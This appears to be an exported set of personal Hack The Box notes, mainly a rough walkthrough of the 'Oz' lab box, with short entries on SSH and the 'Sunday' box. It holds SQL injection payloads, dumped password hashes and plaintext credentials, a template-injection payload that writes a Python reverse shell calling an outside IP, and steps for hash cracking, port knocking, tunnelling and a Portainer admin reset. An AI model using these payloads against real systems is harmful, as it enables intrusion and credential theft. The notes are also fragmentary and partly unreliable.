\u0026ndash;level 5 \u0026ndash;risk 3\n-u url also for get request\n\u0026ndash;batch run default yes\n\u0026ndash;* = the parameter to fuzz\nI do love to watch sqlmap scroll down the screen.\nsqlmap \u0026ndash;batch -u \u0026ldquo;http://os.htb/users/admin*\u0026quot; \u0026ndash;level 5 \u0026ndash;risk 3 \u0026ndash;dump\nDatabase: ozdb Table: users_gbw [6 entries] +----+-------------+----------------------------------------------------------------------------------------+ | id | username | password | +----+-------------+----------------------------------------------------------------------------------------+ | 1 | dorthi | $pbkdf2-sha256$5000$aA3h3LvXOseYk3IupVQKgQ$ogPU/XoFb.nzdCGDulkW3AeDZPbK580zeTxJnG0EJ78 | | 2 | tin.man | $pbkdf2-sha256$5000$GgNACCFkDOE8B4AwZgzBuA$IXewCMHWhf7ktju5Sw.W.ZWMyHYAJ5mpvWialENXofk | | 3 | wizard.oz | $pbkdf2-sha256$5000$BCDkXKuVMgaAEMJ4z5mzdg$GNn4Ti/hUyMgoyI7GKGJWeqlZg28RIqSqspvKQq6LWY | | 4 | coward.lyon | $pbkdf2-sha256$5000$bU2JsVYqpbT2PqcUQmjN.Q$hO7DfQLTL6Nq2MeKei39Jn0ddmqly3uBxO/tbBuw4DY | | 5 | toto | $pbkdf2-sha256$5000$Zax17l1Lac25V6oVwnjPWQ$oTYQQVsuSz9kmFggpAWB0yrKsMdPjvfob9NfBq4Wtkg | | 6 | admin | $pbkdf2-sha256$5000$d47xHsP4P6eUUgoh5BzjfA$jWgyYmxDK.slJYUTsv9V9xZ3WWwcl9EBOsz.bARwGBQ | Database: ozdb Table: tickets_gbw [12 entries] +----+----------+--------------------------------------------------------------------------------------------------------------------------------+ | id | name | desc | +----+----------+--------------------------------------------------------------------------------------------------------------------------------+ | 1 | GBR-987 | Reissued new id_rsa and id_rsa.pub keys for ssh access to dorthi. | | 2 | GBR-1204 | Where did all these damn monkey's come from!? I need to call pest control. | | 3 | GBR-1205 | Note to self: Toto keeps chewing on the curtain, find one with dog repellent. | | 4 | GBR-1389 | Nothing to see here... V2hhdCBkaWQgeW91IGV4cGVjdD8= | | 5 | GBR-4034 | Think of a better secret knock for the front door. Doesn't seem that secure, a Lion got in today. | | 6 | GBR-5012 | I bet you won't read the next entry. | | 7 | GBR-7890 | HAHA! Made you look. | | 8 | GBR-7945 | Dorthi should be able to find her keys in the default folder under /home/dorthi/ on the db. | | 9 | GBR-8011 | Seriously though, WW91J3JlIGp1c3QgdHJ5aW5nIHRvbyBoYXJkLi4uIG5vYm9keSBoaWRlcyBhbnl0aGluZyBpbiBiYXNlNjQgYW55bW9yZS4uLiBjJ21vbi4= | | 10 | GBR-8042 | You are just wasting time now... someone else is getting user.txt | | 11 | GBR-8457 | Look... now they've got root.txt and you don't even have user.txt | | 12 | GBR-9872 | db information loaded to ticket application for shared db access | +----+----------+--------------------------------------------------------------------------------------------------------------------------------+  V2hhdCBkaWQgeW91IGV4cGVjdD8\nWhat did you expecd\nWW91J3JlIGp1c3QgdHJ5aW5nIHRvbyBoYXJkLi4uIG5vYm9keSBoaWRlcyBhbnl0aGluZyBpbiBiYXNlNjQgYW55bW9yZS4uLiBjJ21vbi4=\nYou\u0026rsquo;re just trying too hard\u0026hellip; nobody hides anything in base64 anymore\u0026hellip; c\u0026rsquo;mon.\nunion injections\n%20 is url space\nusers/admin\u0026rsquo;\u0026ndash;+- ==== 500 error\nusers/admin\u0026rsquo;\u0026ndash;%20- ===works\n\u0026lsquo;or 1\u0026rsquo;=1 url encoded looks like this \u0026lsquo;%20or%201=\u0026lsquo;1\n1 is the first user in the database to get the other users we have to go down the table\ngo into the user functions\n'%20limit%201,1--%20-' '%20or%201='1'%20limit%202,1--%20-'  changing the row in column one will go down the list\n'%20or%201='1'%20limit%203,1--%20-' output {\u0026quot;username\u0026quot;:\u0026quot;tin.man\u0026quot;} '%20or%201='1'%20limit%202,1--%20-' output {\u0026quot;username\u0026quot;:\u0026quot;wizard.oz\u0026quot;} '%20or%201='1'%20limit%203,1--%20-' output {\u0026quot;username\u0026quot;:\u0026quot;coward.lyon\u0026quot;} '%20or%201='1'%20limit%204,1--%20-' output {\u0026quot;username\u0026quot;:\u0026quot;toto\u0026quot;} '%20or%201='1'%20limit%205,1--%20-' output {\u0026quot;username\u0026quot;:\u0026quot;admin\u0026quot;} the sixth is null  The password should be the seocnd column\nunion select burp\nGET /users/chicken\u0026rsquo;%20union%20select%20all%20user()\u0026ndash;%20- HTTP/1.1\n{\u0026ldquo;username\u0026rdquo;:\u0026ldquo;dorthi@10.100.10.6\u0026rdquo;}\nLOAD_FILE\nGET /users/chicken\u0026rsquo;%20union%20select%20all%20LOAD_FILE(\u0026lsquo;home/\u0026rsquo;)\u0026ndash;%20- HTTP/1.1\nimporting the binascii library to convert the text into a hex format\npython3\n   import binascii binascii.hexlify(\u0026ldquo;/home/dorthi/.ssh/id_rsa\u0026rdquo;) Traceback (most recent call last): File \u0026ldquo;\u0026rdquo;, line 1, in  TypeError: a bytes-like object is required, not \u0026lsquo;str\u0026rsquo; binascii.hexlify(b\u0026rdquo;/home/dorthi/.ssh/id_rsa\u0026rdquo;) b\u0026rsquo;2f686f6d652f646f727468692f2e7373682f69645f727361\u0026rsquo; exit\n   burp getting usershells\npython running the backend because when you run 7*\u0026lsquo;7\u0026rsquo; it prints 7 7\u0026rsquo;s\nhttp://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet\nhttps://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20injections\nLoad\nname=chicken\u0026amp;desc={{ config.from_pyfile(\u0026lsquo;/tmp/chicken.cfg\u0026rsquo;) }}\nwrite\nname=chicken\u0026amp;desc={{ \u0026ldquo;.class.mro[2].subclasses()[40](\u0026lsquo;/tmp/chicken.cfg\u0026rsquo;, \u0026lsquo;w\u0026rsquo;).write(\u0026lsquo;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026ldquo;10.10.14.14\u0026rdquo;,9051));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\u0026ldquo;/bin/sh\u0026rdquo;,\u0026ldquo;-i\u0026rdquo;]);\u0026lsquo;) }}\nread\nname=chicken\u0026amp;desc={{ \u0026ldquo;.class.mro[2].subclasses()[40](\u0026lsquo;/tmp/chicken.cfg\u0026rsquo;).read() }}\nGET /users/chicken\u0026rsquo;%20union%20select%20all%20LOAD_FILE(0x2f686f6d652f646f727468692f2e7373682f69645f727361)\u0026ndash;%20-\nHASHCAT\nhashcat -a 0 -m 10000 clean.hashes /opt/htb/wordlist/rockyou.txt\nDjango (PBKDF2-SHA256)\n10000\ncat users.hashes |awk -F, '{print $4}' or 2 or 3 depends  https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20injections\ntesting for whats working on the back end\nwizardofoz22\npython -c \u0026lsquo;import pty;pty.spawn(\u0026ldquo;/bin/bash\u0026rdquo;)\u0026rsquo;\npython -c \u0026lsquo;import pty;pty.spawn(\u0026ldquo;/bin/sh\u0026rdquo;)\u0026rsquo;\ncrtl+z , then type stty raw-echo, crtl+z then type reset\ncat knockd.conf [options] logfile = /var/log/knockd.log\n[opencloseSSH]\n sequence = 40809:udp,50212:udp,46969:udp seq_timeout = 15 start_command = ufw allow from %IP% to any port 22 cmd_timeout = 10 stop_command = ufw delete allow from %IP% to any port 22 tcpflags = syn  for i in 40809 50212 46969; do nc -zu oz.htb $i ;done\ninside tickerter database.py hardcoded creds\ndorthi:N0Pl4c3L1keH0me@10.100.10.4/ozdb\nmysql -u dorthi -p -h 10.100.10.4\nssh\nopenssl rsa -in dorthi_key -out dorthi.ssh\nsome how all of that comes together to give produce ssh connection. first i believe ssh is open but only response to a tcp connection. so when you knock these three ports in a row it will open up a ssh conneciton for 10 seconds then close it. the for loop run through the three port variables and\nsudo -l Matching Defaults entries for dorthi on Oz: env_reset, mail_badpass, N0Pl4c3L1keH0me\nsecure_path=/usr/local/sbin/:/usr/local/bin/:/usr/sbin/:/usr/bin/:/sbin/:/bin/:/snap/bin\nUser dorthi may run the following commands on Oz: (ALL) NOPASSWD: /usr/bin/docker network inspect * (ALL) NOPASSWD: /usr/bin/docker network ls\nsudo docker network ls\nsudo docker network ls NETWORK ID NAME DRIVER SCOPE 4e64c670965c bridge bridge local 49c1b0c16723 host host local 3ccc2aa17acf none null local 48148eb6a512 prodnet bridge local\nsudo docker network inspect\nwebapi\nozdb\ntix-app\ncd/containers/database\nfound in start.sh\nROOT_PASSWORD=SuP3rS3cr3tP@ss\n \u0026quot;Containers\u0026quot;: { \u0026quot;139ba9457f1a630ee3a072693999c414901d7df49ab8a70b926d246f9ca6cc69\u0026quot;: { \u0026quot;Name\u0026quot;: \u0026quot;webapi\u0026quot;, \u0026quot;EndpointID\u0026quot;: \u0026quot;f3555ebb0f7e0571b0667b260ff809b392f3eeffd1a0d4d24643132295676ad3\u0026quot;, \u0026quot;MacAddress\u0026quot;: \u0026quot;02:42:0a:64:0a:06\u0026quot;, \u0026quot;IPv4Address\u0026quot;: \u0026quot;10.100.10.6/29\u0026quot;, \u0026quot;IPv6Address\u0026quot;: \u0026quot;\u0026quot; }, \u0026quot;b9b370edd41a9d3ae114756d306f2502c420f48a4d7fbe36ae31bc18cf7ddb7c\u0026quot;: { \u0026quot;Name\u0026quot;: \u0026quot;ozdb\u0026quot;, \u0026quot;EndpointID\u0026quot;: \u0026quot;be4bcb170ed830949e764b336a98c3c4b072cfa906bde1a1d437d44562056c17\u0026quot;, \u0026quot;MacAddress\u0026quot;: \u0026quot;02:42:0a:64:0a:04\u0026quot;, \u0026quot;IPv4Address\u0026quot;: \u0026quot;10.100.10.4/29\u0026quot;, \u0026quot;IPv6Address\u0026quot;: \u0026quot;\u0026quot; }, \u0026quot;c26a7bc669289e40144fa1ad25546f38e4349d964b7b3d4fea13e15fe5a9fb01\u0026quot;: { \u0026quot;Name\u0026quot;: \u0026quot;tix-app\u0026quot;, \u0026quot;EndpointID\u0026quot;: \u0026quot;25e5afcafe2a6e98bf3dbe016106d0587a2a4986985e7d4795b2e48c213aadf1\u0026quot;, \u0026quot;MacAddress\u0026quot;: \u0026quot;02:42:0a:64:0a:02\u0026quot;, \u0026quot;IPv4Address\u0026quot;: \u0026quot;10.100.10.2/29\u0026quot;, \u0026quot;IPv6Address\u0026quot;: \u0026quot;\u0026quot; }  BRIDGE  } ] }, \u0026quot;Internal\u0026quot;: false, \u0026quot;Attachable\u0026quot;: false, \u0026quot;Containers\u0026quot;: { \u0026quot;e267fc4f305575070b1166baf802877cb9d7c7c5d7711d14bfc2604993b77e14\u0026quot;: { \u0026quot;Name\u0026quot;: \u0026quot;portainer-1.11.1\u0026quot;, \u0026quot;EndpointID\u0026quot;: \u0026quot;0f02aa142cdda63ddbc41be13e1716e9d8b1f0747a4abe4f47cd96dc593743c8\u0026quot;, \u0026quot;MacAddress\u0026quot;: \u0026quot;02:42:ac:11:00:02\u0026quot;, \u0026quot;IPv4Address\u0026quot;: \u0026quot;172.17.0.2/16\u0026quot;, \u0026quot;IPv6Address\u0026quot;: \u0026quot;\u0026quot; } }, \u0026quot;Options\u0026quot;: { \u0026quot;com.docker.network.bridge.default_bridge\u0026quot;: \u0026quot;true\u0026quot;, \u0026quot;com.docker.network.bridge.enable_icc\u0026quot;: \u0026quot;true\u0026quot;, \u0026quot;com.docker.network.bridge.enable_ip_masquerade\u0026quot;: \u0026quot;true\u0026quot;, \u0026quot;com.docker.network.bridge.host_binding_ipv4\u0026quot;: \u0026quot;0.0.0.0\u0026quot;, \u0026quot;com.docker.network.bridge.name\u0026quot;: \u0026quot;docker0\u0026quot;, \u0026quot;com.docker.network.driver.mtu\u0026quot;: \u0026quot;1500\u0026quot; }, \u0026quot;Labels\u0026quot;: {}  NMAP nmap -sT -T5 172.17.02 Starting Nmap 7.01 ( https://nmap.org ) at 2019-01-21 09:13 CST Stats: 0:00:00 elapsed; 0 hosts completed (0 up), 1 undergoing Ping Scan Ping Scan Timing: About 100.00% done; ETC: 09:13 (0:00:00 remaining) Stats: 0:00:01 elapsed; 0 hosts completed (0 up), 1 undergoing Ping Scan Parallel DNS resolution of 1 host. Timing: About 0.00% done Nmap scan report for 172.17.02 (172.17.0.2) Host is up (0.00017s latency). Not shown: 999 closed ports PORT STATE SERVICE 9000/tcp open cslistener  Proxychain Nmap using ~C capitcal c trick then use proxychain make sure to turn off dns and turn on quite-mode\nproxychains nmap -sT 172.17.0.2 -Pn --open -T4 ProxyChains-3.1 (http://proxychains.sf.net) Starting Nmap 7.70 ( https://nmap.org ) at 2019-01-20 17:52 EST Nmap scan report for 172.17.0.2 Host is up (0.044s latency). Not shown: 999 closed ports PORT STATE SERVICE 9000/tcp open cslistener  NetCat\nusing a bash for loop, it will go through the sequence. this can become cluttered\nfor ip in $(seq 1 65000);do nc -zv -w 1 172.17.0.2 $ip 2\u0026gt;\u0026amp;1 \u0026gt; /tmp/nul | grep -v 'timed \u0026amp; done for ip in $(seq 9000 9010);do nc -zv -w 1 172.17.0.2 $ip 2\u0026gt;\u0026amp;1 |grep 'succeeded!' \u0026amp; done  I dont like the for loop because it just craps out so much output. for some reason it always makes a mess. I think i modified the former from the netcat ip range scanner. The below option is much cleaner.\nnc -zv -w 1 172.17.0.2 8900-10000 2\u0026gt;\u0026amp;1 | grep succeeded!  Exploiting Portainer changing the password on portainer.io submit a POST request to the web directory/api/users/admin/init. I\u0026rsquo;m not sure why submiting to init resets the admin password. i guess that\u0026rsquo;s the api used to reset the password. Again i dont know. Finish the request like in the pciture below. This will reset the admin password to whatever password you submit.\nLogin with the submitted password\nPortainer.io\ni think this is pretty cool i love messing with these web interfaces.\nsome problems may occur the ssh tunnel may drop youll have to reset it by using the port knocking for loop. Be sure to turn off burp the proxy really slows it down it will not load.\nc\nit could take awhile to create the container or hang depends.\nchange from /bin/bash to /bin/sh. there is a cron job running resetting the containers to default.\nssh\u0026gt; -L9051:172.17.0.2:9050\nanother method is using the -L switch when logging in, you may also use sshutle.\nssh -i dorthi.ssh dorthi@oz.htb -L 9051:172.17.0.2:9000\npython:2.7-alpine\ni could not get shuttle to work for some reason\nsshuttle.\nsshuttle -r dorthi@oz.htb 172.0.0.0/16 \u0026ndash;ssh-cmd \u0026lsquo;ssh -i dorthi.ssh\u0026rsquo;\n"
},
{
	"uri": "/tools/ssh/",
	"title": "ssh",
	"tags": [],
	"description": "",
	"content": "SSH - secure shell Is a commonly used port/service. In fact, it is almost on every Linux Box on hackthebox. Network administrators use it to remotely managing Network Peripherals. There are a couple CVE\u0026rsquo;s out there for older version 7.3 Open Ssh is vulnerable to a user enumeration attack.\nSSH will commonly use sha-256 encryption to encrypt the traffic. The encryption Bit-Key is commonly set at 2048.\nStart Service\nDirectories private keys might be in\n/etc/ssh /root/.ssh  vi /etc/ssh/sshd_conf PermitRootLogin yes service ssh start\u0026lt;/c\n"
},
{
	"uri": "/hackthebox/boxes/sunday/",
	"title": "sunday",
	"tags": [],
	"description": "",
	"content": " INCOMPLETE\nsunos 5.111 2008, SunSsh\nFINGER USER LIST finger user@10.10.10.76 -s displays the user login real terminal write status no access is a least priviliege user -l same as -s but with directory information -p limits -l output  stuff\nthis box requires equine wordlist you can’t use the standard one. Metasploit module, be sure to change the dictionary used to enumerate the user list.\nSammy Sunny\nHASHCAT\nI don’t remember where I found the hashes, i digress. this is really going to turn into a hashcat guide bauhahahahaha\nIdentifying the type of hash was a major pain. https://hashcat.net/wiki/doku.php?id=example_hashes\nssh uses diffie hellman group sha1 for the key exchange. legacy\nssh -oKexAlgorithms=+diffie-hellman-group1-sha1 @10.10.10.79 -p 22022 -P sunday  passwords sunny\nRoot\nto get a root shell you could copy over /etc/shadow.\n"
}]